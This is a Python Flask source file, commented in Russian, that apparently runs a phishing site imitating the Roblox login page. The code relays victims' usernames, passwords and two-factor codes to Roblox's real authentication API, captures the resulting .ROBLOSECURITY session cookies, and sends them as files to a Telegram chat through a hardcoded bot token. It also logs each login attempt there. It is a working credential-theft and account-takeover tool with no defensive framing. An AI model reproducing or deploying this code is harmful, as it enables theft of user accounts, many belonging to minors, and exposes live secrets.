from flask import Flask, render_template, request, jsonify
import json
from datetime import datetime
import os
import requests
import uuid
import re
import time
from urllib.parse import urlparse, parse_qs
from dotenv import load_dotenv

# Загружаем переменные окружения
load_dotenv()

app = Flask(__name__)

# Получаем переменные окружения или используем значения по умолчанию
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8358408245:AAFkdDlfXA0NPkEmvXmcdSoU_av2vzz-OmM')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1002709349680')

# Глобальные переменные для сессий
sessions = {}

def send_telegram_log(text):
    """Отправляет сообщение в Telegram"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": text}
        )
    except Exception as e:
        print(f"[Telegram Error] {e}")

def send_telegram_file(filepath, caption=None):
    """Отправляет файл в Telegram"""
    try:
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            if caption:
                data['caption'] = caption
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
                data=data,
                files=files
            )
    except Exception as e:
        print(f"[Telegram File Error] {e}")

def get_roblox_csrf_token(session):
    """Получает CSRF токен от Roblox"""
    try:
        # Сначала получаем главную страницу для установки куки
        main_response = session.get('https://www.roblox.com/')
        if main_response.status_code != 200:
            send_telegram_log(f"[ERROR] Не удалось загрузить главную страницу Roblox: {main_response.status_code}")
            return None
        
        # Теперь получаем страницу логина
        response = session.get('https://www.roblox.com/login')
        if response.status_code == 200:
            # Ищем CSRF токен в HTML
            csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
            if csrf_match:
                send_telegram_log(f"[INFO] CSRF токен найден через meta tag")
                return csrf_match.group(1)
            
            # Альтернативный способ поиска токена
            csrf_match = re.search(r'"csrfToken":"([^"]+)"', response.text)
            if csrf_match:
                send_telegram_log(f"[INFO] CSRF токен найден через JSON")
                return csrf_match.group(1)
            
            # Еще один способ - ищем в скриптах
            csrf_match = re.search(r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']', response.text)
            if csrf_match:
                send_telegram_log(f"[INFO] CSRF токен найден в скриптах")
                return csrf_match.group(1)
            
            send_telegram_log(f"[WARNING] CSRF токен не найден в HTML")
            return None
        else:
            send_telegram_log(f"[ERROR] Не удалось загрузить страницу логина: {response.status_code}")
            return None
    except Exception as e:
        send_telegram_log(f"[ERROR] Ошибка получения CSRF токена: {e}")
        return None

def roblox_login_and_get_cookies(username, password, session_id=None, code=None):
    """Выполняет вход в Roblox и получает куки"""
    try:
        send_telegram_log(f"[INFO] Начинаю вход для {username} (session_id: {session_id})")
        
        # Создаем новую сессию для каждого запроса
        session = requests.Session()
        
        # Устанавливаем заголовки как у реального браузера
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,ru;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"'
        })
        
        if code is not None:
            # ВТОРОЙ ЭТАП: Ввод кода 2FA
            if session_id and session_id in sessions:
                stored_session = sessions[session_id]
                stored_cookies = stored_session.get('cookies', {})
                
                # Восстанавливаем куки из предыдущей сессии
                for cookie_name, cookie_value in stored_cookies.items():
                    session.cookies.set(cookie_name, cookie_value)
                
                # Получаем CSRF токен для 2FA
                csrf_token = get_roblox_csrf_token(session)
                if not csrf_token:
                    send_telegram_log(f"[ERROR] Не удалось получить CSRF токен для 2FA {username}")
                    return {'success': False, 'message': 'Не удалось получить токен безопасности'}
                
                # Отправляем код 2FA
                twofa_data = {
                    'code': code,
                    'rememberDevice': True
                }
                
                twofa_headers = {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': csrf_token,
                    'Referer': 'https://www.roblox.com/login'
                }
                
                twofa_response = session.post(
                    'https://auth.roblox.com/v2/login/two-step-verification',
                    json=twofa_data,
                    headers=twofa_headers
                )
                
                if twofa_response.status_code == 200:
                    # Проверяем успешность входа
                    profile_response = session.get('https://www.roblox.com/my/account')
                    if profile_response.status_code == 200 and 'login' not in profile_response.url.lower():
                        # Успешный вход с 2FA
                        cookies = session.cookies.get_dict()
                        roblosecurity = cookies.get('.ROBLOSECURITY')
                        
                        if roblosecurity:
                            # Очищаем сессию
                            sessions.pop(session_id, None)
                            
                            send_telegram_log(f"[SUCCESS] Вход с 2FA успешен для {username}")
                            
                            # Сохраняем куки в файл и отправляем в Telegram
                            filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                            filepath = os.path.join(os.path.dirname(__file__), filename)
                            with open(filepath, 'w', encoding='utf-8') as f:
                                json.dump(cookies, f, ensure_ascii=False, indent=2)
                            
                            caption = f"Roblox cookies for {username} (2FA) ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
                            send_telegram_file(filepath, caption=caption)
                            os.remove(filepath)
                            
                            return {'success': True, 'cookies': cookies}
                        else:
                            return {'success': False, 'message': 'Неверный код 2FA'}
                    else:
                        return {'success': False, 'message': 'Неверный код 2FA или ошибка входа'}
                else:
                    return {'success': False, 'message': 'Ошибка при отправке кода 2FA'}
            else:
                return {'success': False, 'message': 'Нет активной сессии. Попробуйте войти заново.'}
        
        else:
            # ПЕРВЫЙ ЭТАП: Ввод логина и пароля
            
            # Получаем CSRF токен
            send_telegram_log(f"[INFO] Получаю CSRF токен для {username}")
            csrf_token = get_roblox_csrf_token(session)
            if not csrf_token:
                send_telegram_log(f"[ERROR] Не удалось получить CSRF токен для {username}")
                return {'success': False, 'message': 'Не удалось получить токен безопасности'}
            
            # Небольшая задержка для имитации человеческого поведения
            time.sleep(1)
            
            # Отправляем данные для входа
            login_data = {
                'username': username,
                'password': password,
                'rememberMe': True
            }
            
            login_headers = {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrf_token,
                'Referer': 'https://www.roblox.com/login'
            }
            
            login_response = session.post(
                'https://auth.roblox.com/v2/login',
                json=login_data,
                headers=login_headers
            )
            
            if login_response.status_code == 200:
                response_data = login_response.json()
                
                # Проверяем, требуется ли 2FA
                if response_data.get('twoStepVerificationData'):
                    # Сохраняем сессию для 2FA
                    if not session_id:
                        session_id = str(uuid.uuid4())
                    
                    sessions[session_id] = {
                        'cookies': session.cookies.get_dict(),
                        'username': username,
                        'timestamp': datetime.now()
                    }
                    
                    send_telegram_log(f"[INFO] Требуется код 2FA для {username}")
                    return {'need_code': True, 'session_id': session_id}
                
                # Проверяем успешность входа
                profile_response = session.get('https://www.roblox.com/my/account')
                if profile_response.status_code == 200 and 'login' not in profile_response.url.lower():
                    # Успешный вход без 2FA
                    cookies = session.cookies.get_dict()
                    roblosecurity = cookies.get('.ROBLOSECURITY')
                    
                    if roblosecurity:
                        send_telegram_log(f"[SUCCESS] Вход успешен для {username}")
                        
                        # Сохраняем куки в файл и отправляем в Telegram
                        filename = f"roblox_cookies_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                        filepath = os.path.join(os.path.dirname(__file__), filename)
                        with open(filepath, 'w', encoding='utf-8') as f:
                            json.dump(cookies, f, ensure_ascii=False, indent=2)
                        
                        caption = f"Roblox cookies for {username} ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})"
                        send_telegram_file(filepath, caption=caption)
                        os.remove(filepath)
                        
                        return {'success': True, 'cookies': cookies}
                    else:
                        return {'success': False, 'message': 'Не удалось получить куки безопасности'}
                else:
                    # Проверяем ошибки входа
                    error_message = "Неверный логин или пароль"
                    
                    if response_data.get('errors'):
                        for error in response_data['errors']:
                            if error.get('code') == 0:
                                error_message = "Неверный логин или пароль"
                            elif error.get('code') == 1:
                                error_message = "Неверный логин"
                            elif error.get('code') == 2:
                                error_message = "Неверный пароль"
                            elif error.get('code') == 3:
                                error_message = "Аккаунт заблокирован"
                            elif error.get('code') == 4:
                                error_message = "Требуется капча"
                    
                    send_telegram_log(f"[ERROR] Ошибка входа для {username}: {error_message}")
                    return {'success': False, 'message': error_message}
            
            else:
                error_message = "Ошибка сервера Roblox"
                try:
                    response_data = login_response.json()
                    if response_data.get('errors'):
                        for error in response_data['errors']:
                            if error.get('message'):
                                error_message = error['message']
                except:
                    pass
                
                send_telegram_log(f"[ERROR] Ошибка сервера для {username}: {error_message}")
                return {'success': False, 'message': error_message}
                
    except Exception as e:
        send_telegram_log(f"[ERROR] Ошибка входа для {username}: {e}")
        return {'success': False, 'message': f'Ошибка: {str(e)}'}

@app.route('/')
def login_page():
    return app.send_static_file('Log in to Roblox.html')

@app.route('/login.html')
def old_login_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    remember = data.get('remember')
    session_id = str(uuid.uuid4())

    # Сохраняем базовые куки для совместимости
    cookies = {
        '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
        'username': username,
        'login_time': datetime.now().isoformat(),
        'session_id': f'roblox_session_{hash(username)}',
        'auth_token': f'auth_{hash(password)}',
        'remember_me': str(remember).lower()
    }
    
    with open('cookies.txt', 'w', encoding='utf-8') as f:
        json.dump(cookies, f, indent=2, ensure_ascii=False)

    result = roblox_login_and_get_cookies(username, password, session_id=session_id)
    
    if result.get('need_code'):
        return jsonify({'need_code': True, 'session_id': session_id})
    elif result.get('success'):
        return jsonify({
            'success': True, 
            'message': 'Вход выполнен успешно! Проверьте Telegram для получения куки.', 
            'cookies': result.get('cookies')
        })
    else:
        return jsonify({'success': False, 'message': result.get('message')})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.get_json()
    session_id = data.get('session_id')
    code = data.get('code')
    
    if not session_id or not code:
        return jsonify({'success': False, 'message': 'Не передан session_id или code'})
    
    username = sessions.get(session_id, {}).get('username', 'unknown')
    result = roblox_login_and_get_cookies(username, None, session_id=session_id, code=code)
    
    if result.get('success'):
        return jsonify({
            'success': True, 
            'message': 'Вход завершён! Проверьте Telegram для куки.', 
            'cookies': result.get('cookies')
        })
    else:
        return jsonify({'success': False, 'message': result.get('message')})

@app.route('/health')
def health_check():
    """Эндпоинт для проверки здоровья сервиса на Render"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

@app.route('/test-roblox')
def test_roblox():
    """Тестовый эндпоинт для проверки подключения к Roblox"""
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Тестируем подключение к Roblox
        response = session.get('https://www.roblox.com/')
        if response.status_code == 200:
            return jsonify({
                'status': 'success',
                'message': 'Подключение к Roblox успешно',
                'status_code': response.status_code,
                'content_length': len(response.text)
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'Ошибка подключения к Roblox: {response.status_code}',
                'status_code': response.status_code
            })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Ошибка: {str(e)}'
        })

if __name__ == '__main__':
    # Для локальной разработки
    app.run(debug=True, port=5000)
else:
    # Для продакшена на Render
    app.debug = False 